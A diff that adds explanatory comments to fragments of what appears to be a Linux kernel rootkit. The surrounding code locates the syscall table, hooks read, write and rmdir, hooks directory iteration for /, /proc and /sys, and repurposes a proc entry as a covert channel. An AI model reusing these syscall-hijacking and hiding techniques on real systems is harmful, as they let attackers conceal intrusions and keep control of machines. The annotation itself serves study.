@@ -47,6 +47,13 @@
 // Might differ from one version of Linux kernel to another, so update as
 // necessary
 // http://lxr.free-electrons.com/source/fs/proc/internal.h?v=4.4#L31
+// From the website: "The idea is to create an in-memory tree (like the actual
+// /proc filesystem tree) of these proc_dir_entries, so that we can dinamically
+// add new files to /proc
+//
+// parent/subdir are used for the directory structure (every /proc file has a parent,
+// but "subdir" is empty for all non-directory entries).
+// subdir_node is used to build the rb tree "subdir"of the parent."
 struct proc_dir_entry {
     unsigned int low_ino;
     umode_t mode;
@@ -255,6 +262,11 @@ void hook_remove_all(void)
 
 unsigned long read_count = 0;
 
+/* 
+ * The asmlinkage modifier is typically used with syscall functions. 
+ * It tells the compiler to look for the function parameters in the stack,
+ * rather than in the registers (for performance improvement).
+ */
 asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
 {
     read_count ++;
@@ -830,7 +842,7 @@ int setup_proc_comm_channel(void)
 {
     //struct containig the posible file operations (only used for the "temporary process")
     static const struct file_operations proc_file_fops = {0};
-    //the struct proc_dir_entry is defined at the beginning of this file
+    //the struct proc_dir_entry is defined at the beginning of this file (see description above)
     struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
     //this line assigns the parent process proc_dir_entry struct of the newly created process to itself (effectively swaps it)
     proc_entry = proc_entry->parent;
@@ -946,8 +958,12 @@ int init(void)
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
-    //the function get_fop is defined in this file, returns a pointer to the file operations table of the file object located on the path passed as argument.
-    //where are functions root_iterate, proc_iterate and sys_iterate defined??? <-they are defined using macros in this file above
+    /*
+     * The function get_fop is defined in this file, returns a pointer to the file operations table
+     * of the file object located on the path passed as the function's argument.
+     * Functions root_iterate, proc_iterate and sys_iterate are defined using macros in this 
+     * file above, macros names: FILLDIR_START(NAME), FILLDIR_END(NAME), READDIR(NAME), etc...
+     */
     asm_hook_create(get_fop("/")->iterate, root_iterate);
     asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
     asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
@@ -959,12 +975,17 @@ int init(void)
     asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
 
 #endif
-
+    /* Locate the system call table */
     sys_call_table = find_syscall_table();
     pr_info("Found sys_call_table at %p\n", sys_call_table);
-
+   
+    /* Hook rmdir() syscall with our onw (i.e. asm_rmdir)
+     * note: parameter __NR_rmdir is the position number inside the syscall table
+     * associated with the rmdir  syscall. This is defined in <asm/unistd.h>
+     */
     asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
-
+    
+    /* Hook read() and write() syscalls with our own */
     hook_create(&sys_call_table[__NR_read], read);
     hook_create(&sys_call_table[__NR_write], write);
 
